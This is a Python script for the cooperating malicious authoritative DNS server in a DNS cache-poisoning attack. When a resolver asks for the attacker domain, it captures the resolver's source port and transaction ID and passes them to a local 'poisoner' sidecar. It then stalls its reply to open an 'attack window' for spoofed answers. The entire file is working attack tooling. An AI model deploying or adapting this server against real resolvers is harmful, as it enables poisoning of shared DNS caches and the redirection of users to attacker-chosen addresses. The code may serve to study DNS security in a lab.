import socket
import time
import random
from dnslib import RR, A, QTYPE, DNSLabel
from dnslib.server import DNSServer, DNSLogger

ATTACKER_DOMAIN = "example.com"
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 53

DELAY_SECONDS = 1.0

SIDECAR_IP = "127.0.0.1"      # Send to the local machine
SIDECAR_PORT = 12345         # The poisoner script will listen on this port

class DelayedCooperativeResolver:
    """
    A cooperative authoritative server that first forwards intelligence,
    then delays, and finally sends a legitimate response.
    """
    def __init__(self, sidecar_ip, sidecar_port):
        self.sidecar_ip = sidecar_ip
        self.sidecar_port = sidecar_port
        self.sidecar_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"[*] [Server] Intelligence will be forwarded to {self.sidecar_ip}:{self.sidecar_port}")

    def forward_intelligence(self, source_port, txid):
        """Formats and sends the source port and TXID."""
        message = f"sport={source_port},txid={txid}".encode('utf-8')
        self.sidecar_socket.sendto(message, (self.sidecar_ip, self.sidecar_port))
        print(f"[*] [Server] Intelligence sent: {message.decode('utf-8')}")

    def generate_random_ip(self):
        """Generates a random private IP address for the response."""
        return "10.{}.{}.{}".format(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def resolve(self, request, handler):
        """
        The core logic for handling DNS requests.
        """
        qname = request.q.qname
        qtype = request.q.qtype

        print(f"\n[+] [Server] Received query for {qname} from {handler.client_address[0]}:{handler.client_address[1]}")

        # Check if it's a query for the domain and type we care about
        if qname.matchSuffix(ATTACKER_DOMAIN) and qtype == QTYPE.A:
            # 1. [CRITICAL STEP] Immediately forward the intelligence
            source_port = handler.client_address[1]
            txid = request.header.id
            self.forward_intelligence(source_port, txid)

            # 2. [CRITICAL STEP] Wait to create the attack window
            print(f"[*] [Server] Starting delay of {DELAY_SECONDS} second(s)...")
            time.sleep(DELAY_SECONDS)

            # 3. After the delay, prepare and send a normal, harmless response
            reply = request.reply()
            random_ip = self.generate_random_ip()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(random_ip)))

            print(f"[!] [Server] Delay finished. Sending legitimate response: {qname} -> {random_ip}")
            return reply

        # For all other queries, respond normally
        print(f"[-] [Server] Query does not match rules. Responding normally.")
        return request.reply()

if __name__ == '__main__':
    logger = DNSLogger(prefix=False)
    resolver = DelayedCooperativeResolver(SIDECAR_IP, SIDECAR_PORT)
    server = DNSServer(resolver, port=LISTEN_PORT, address=LISTEN_IP, logger=logger)

    print(f"[*] Cooperative Authoritative Server starting, listening on {LISTEN_IP}:{LISTEN_PORT}")
    print(f"[*] Any A record query for *.{ATTACKER_DOMAIN} will trigger the attack window.")
    print(f"[*] Attack window time (delay) set to: {DELAY_SECONDS} seconds.")

    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.stop()